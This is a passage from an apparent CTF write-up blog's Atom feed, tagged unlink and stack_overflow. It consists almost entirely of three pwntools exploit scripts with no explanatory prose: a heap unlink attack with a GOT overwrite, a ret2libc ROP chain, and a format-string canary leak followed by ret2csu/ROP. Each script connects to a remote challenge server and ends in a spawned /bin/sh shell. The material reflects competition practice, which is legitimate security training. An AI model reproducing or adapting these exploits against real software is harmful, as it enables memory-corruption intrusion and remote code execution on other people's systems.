class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process('./pwn')</span></span><br><span class="line">p=remote(<span class="string">'111.33.164.6'</span>,<span class="number">50007</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"choice &gt;&gt;"</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"size:"</span>,str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"choice &gt;&gt;"</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"id:"</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">'size:'</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice &gt;&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"id:"</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"choice &gt;&gt;"</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"id:"</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#2</span></span><br><span class="line">chunk0_addr=<span class="number">0x006020E0</span></span><br><span class="line">target=<span class="number">0x0602020</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xf0</span>)+p64(chunk0_addr<span class="number">-0x18</span>)+p64(chunk0_addr<span class="number">-0x10</span>)</span><br><span class="line">payload+=(<span class="number">0xf8</span><span class="number">-5</span>*<span class="number">8</span>)*<span class="string">'a'</span>+p64(<span class="number">0xf0</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,len(payload)+<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload=p64(target)+p64(target)+p64(target)+p64(target)+p64(target<span class="number">-0x8</span>)</span><br><span class="line">edit(<span class="number">0</span>,len(payload)+<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your data:'</span>)</span><br><span class="line">free_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'free_addr====&gt;0x%x'</span>%free_addr)</span><br><span class="line">libc_base=free_addr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">log.success(<span class="string">'libc_base====&gt;0x%x'</span>%libc_base)</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">1</span>,len(p64(system_addr))+<span class="number">1</span>,p64(system_addr))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">9</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="於讴">於讴</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50006</span>)</span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line"><span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc=ELF(<span class="string">'libc-2.19.so'</span>)</span><br><span class="line">main_addr=<span class="number">0x04007C3</span></span><br><span class="line">put_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">start_got=elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">poprdi=<span class="number">0x414fc3</span></span><br><span class="line">start_libc=libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'OH, WHY ARE YOU SO GOOD?\n'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span> + p64(poprdi)+p64(start_got)+p64(put_plt) + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">start_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(start_addr)</span><br><span class="line">libc_base = start_addr - start_libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">bin_sh=<span class="number">0x1633e8</span></span><br><span class="line">system=libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">bin_addr=bin_sh+libc_base</span><br><span class="line">system_addr=system+libc_base</span><br><span class="line"><span class="keyword">print</span> hex(bin_addr)</span><br><span class="line"><span class="keyword">print</span> hex(system_addr)</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'OH, WHY ARE YOU SO GOOD?\n'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span> + p64(poprdi)+p64(bin_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="副墨">副墨</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process("./bf")</span></span><br><span class="line"><span class="comment">#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line">p=remote(<span class="string">"111.33.164.6"</span>,<span class="number">50001</span>)</span><br><span class="line">elf=ELF(<span class="string">"./bf"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Are you sure want to play the game?\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload=<span class="string">'%17$p%26$p'</span></span><br><span class="line">payload=payload.ljust(<span class="number">28</span>,<span class="string">'A'</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">p.sendafter(<span class="string">"Input your name : \n"</span>,payload)</span><br><span class="line"></span><br><span class="line">array=[<span class="number">7427</span> , <span class="number">39356</span>  ,<span class="number">9595</span>  ,<span class="number">54062</span>  ,<span class="number">67371</span> , <span class="number">42578</span>  ,<span class="number">92585</span>  ,<span class="number">76990</span>  ,<span class="number">22615</span>  ,<span class="number">53318</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> array:</span><br><span class="line">    p.recvuntil(<span class="string">"Now guess:"</span>)</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Correct!\n"</span>)</span><br><span class="line">canary=eval(p.recv(<span class="number">18</span>))</span><br><span class="line">success(<span class="string">"canary ==&gt; 0x%x"</span>%canary)</span><br><span class="line">base_addr=eval(p.recv(<span class="number">14</span>))<span class="number">-0x970</span></span><br><span class="line">success(<span class="string">"base_addr ==&gt; 0x%x"</span>%base_addr)</span><br><span class="line">pop_rdi_ret=<span class="number">0xdb3</span>+base_addr</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">52</span>+p64(canary)+<span class="string">'A'</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(base_addr+<span class="number">0x970</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">"Are you sure want to play the game?\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload=<span class="string">'%19$p'</span></span><br><span class="line">payload=payload.ljust(<span class="number">28</span>,<span class="string">'A'</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">p.sendafter(<span class="string">"Input your name : \n"</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> array:</span><br><span class="line">    p.recvuntil(<span class="string">"Now guess:"</span>)</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Correct!\n"</span>)</span><br><span class="line">libc_start_main=eval(p.recv(<span class="number">14</span>))<span class="number">-240</span></span><br><span class="line">success(<span class="string">"libc_start_main ==&gt; 0x%x"</span>%libc_start_main)</span><br><span class="line"></span><br><span class="line">system_addr=base_addr+elf.plt[<span class="string">"system"</span>]</span><br><span class="line">foot=base_addr+<span class="number">0xDAA</span></span><br><span class="line">init=base_addr+<span class="number">0xD90</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">"puts"</span>]+base_addr</span><br><span class="line">puts_got=elf.got[<span class="string">"read"</span>]+base_addr</span><br><span class="line">read_plt=elf.plt[<span class="string">"read"</span>]+base_addr</span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]+base_addr</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">52</span>+p64(canary)+<span class="string">'A'</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(foot)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(read_got)</span><br><span class="line">payload+=p64(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(elf.bss()+base_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(init)</span><br><span class="line">payload+=<span class="string">'A'</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(elf.bss()+base_addr)</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;&lt;span id=&quot;立雪&quot;&gt;立雪&lt;/span&gt;&lt;/h1&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cla
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.top/categories/Writeup/"/>
    
    
      <category term="unlink" scheme="http://Whali3n51.top/tags/unlink/"/>
    
      <category term="stack_overflow" scheme="http://Whali3n51.top/tags/stack-overflow/"/>
    
  </entry>
  
</feed>
